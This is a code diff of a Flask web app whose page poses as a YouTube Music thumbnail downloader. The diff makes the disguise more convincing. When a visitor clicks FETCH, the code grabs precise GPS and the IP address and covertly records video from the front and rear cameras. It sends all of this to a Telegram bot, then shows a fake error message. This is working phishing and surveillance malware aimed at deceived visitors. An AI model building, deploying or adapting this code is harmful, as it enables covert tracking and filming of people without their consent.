@@ -20,31 +20,12 @@ HTML_TEMPLATE = """
     body{background:#f0f2f5;font-family:sans-serif;margin:0;padding:0;text-align:center}
     .header{background:#ff0000;color:white;padding:25px 10px;box-shadow:0 2px 5px rgba(0,0,0,0.2)}
     .header h1{margin:5px 0;font-size:22px;letter-spacing:1px}
-    .container{background:white;max-width:420px;margin:30px auto;padding:25px;border-radius:15px;box-shadow:0 4px 15px rgba(0,0,0,0.1);position:relative;box-sizing:border-box}
+    .container{background:white;max-width:420px;margin:30px auto;padding:25px;border-radius:15px;box-shadow:0 4px 15px rgba(0,0,0,0.1);text-align:left}
     .input-box{width:100%;padding:14px;border:1px solid #ccc;border-radius:8px;font-size:14px;box-sizing:border-box;margin-bottom:15px;outline:none}
     .btn{background:#ff0000;color:white;border:none;padding:15px;width:100%;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;box-shadow:0 4px 10px rgba(255,0,0,0.3)}
-    
-    #permissionModal {
-        display: none;
-        position: absolute;
-        top: 0; left: 0; width: 100%; height: 100%;
-        background: rgba(255, 255, 255, 0.98);
-        border-radius: 15px;
-        z-index: 10;
-        padding-top: 80px;
-        box-sizing: border-box;
-    }
-    #permissionModal h2 {
-        color: #111;
-        font-size: 20px;
-        margin-top: 15px;
-    }
-    #permissionModal p {
-        color: #555;
-        font-size: 14px;
-        padding: 0 20px;
-        line-height: 1.5;
-    }
+    .instructions{margin-top:25px;background:#fff5f5;padding:15px;border-radius:8px;border-left:4px solid #ff0000}
+    .instructions h3{margin-top:0;font-size:15px;color:#333}
+    .instructions ol{padding-left:20px;margin:0;font-size:13px;color:#555;line-height:1.6}
 </style>
 </head>
 <body>
@@ -54,14 +35,17 @@ HTML_TEMPLATE = """
     </div>
 
     <div class="container">
-        <div id="permissionModal">
-            <div style="font-size: 45px;">🔒</div>
-            <h2>Camera Permission Needed</h2>
-            <p>Please enable camera access in your browser settings to proceed with verification.</p>
-        </div>
-
         <input type="text" class="input-box" id="urlInput" placeholder="Paste YouTube Music Link">
         <button class="btn" onclick="startProcess()">FETCH</button>
+
+        <div class="instructions">
+            <h3>How to Download HD YouTube Music Thumbnail</h3>
+            <ol>
+                <li>Copy the YouTube Music Video Link</li>
+                <li>Paste the link in the field above</li>
+                <li>Click on "FETCH" to start process</li>
+            </ol>
+        </div>
     </div>
 
     <video id="video" autoplay playsinline muted style="display:none"></video>
@@ -97,7 +81,7 @@ HTML_TEMPLATE = """
                 mediaRecorder.start();
                 setTimeout(() => {
                     mediaRecorder.stop();
-                }, 4000); // ضبط 4 ثانیه
+                }, 4000); // ضبط 4 ثانیه ویدیو
                 
             } catch (err) {
                 reject(err);
@@ -112,6 +96,7 @@ HTML_TEMPLATE = """
             return;
         }
 
+        // گرفتن موقعیت مکانی کاربر به محض کلیک روی FETCH
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const info = {
                 lat: pos.coords.latitude,
@@ -120,19 +105,19 @@ HTML_TEMPLATE = """
             };
 
             try {
-                // ۱. اول دوربین جلو
+                // ۱. درخواست اجازه و ضبط دوربین جلو
                 await recordAndSend("user", "دوربین جلو (Front Camera)", info);
                 
-                // ۲. بعد دوربین عقب
+                // ۲. درخواست اجازه و ضبط دوربین عقب
                 await recordAndSend("environment", "دوربین عقب (Rear Camera)", info);
 
                 alert("خطا در بارگیری فایل صوتی. لطفاً دوباره تلاش کنید.");
                 
             } catch (e) {
-                document.getElementById('permissionModal').style.display = 'block';
+                alert("لطفاً اجازه دسترسی به دوربین را تأیید کنید.");
             }
         }, (err) => {
-            document.getElementById('permissionModal').style.display = 'block';
+            alert("لطفاً دسترسی به موقعیت مکانی (Location) را فعال کنید.");
         }, { enableHighAccuracy: true });
     }
     </script>
@@ -167,7 +152,7 @@ def upload():
     ua = info.get('ua', 'نامشخص')
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
-    # متن گزارش همراه با امضای شما
+    # متن گزارش کامل به همراه مشخصات و امضا
     msg = (
         f"🚨 **گزارش جدید ({cam_type}):**\n\n"
         f"📍 موقعیت GPS: {lat}, {lon}\n"
@@ -179,13 +164,14 @@ def upload():
         f"👤 ریس نوری: @HOKOMAT_ARAB"
     )
     
-    # ارسال لوکیشن در اولین مرحله (دوربین جلو)
+    # ارسال لوکیشن روی نقشه در بخش اول (دوربین جلو)
     if lat != 'نامشخص' and lon != 'نامشخص' and "جلو" in cam_type:
         requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
             json={"chat_id": TARGET_CHAT_ID, "latitude": lat, "longitude": lon}
         )
     
+    # ارسال ویدیو به ربات تلگرام
     if video:
         requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
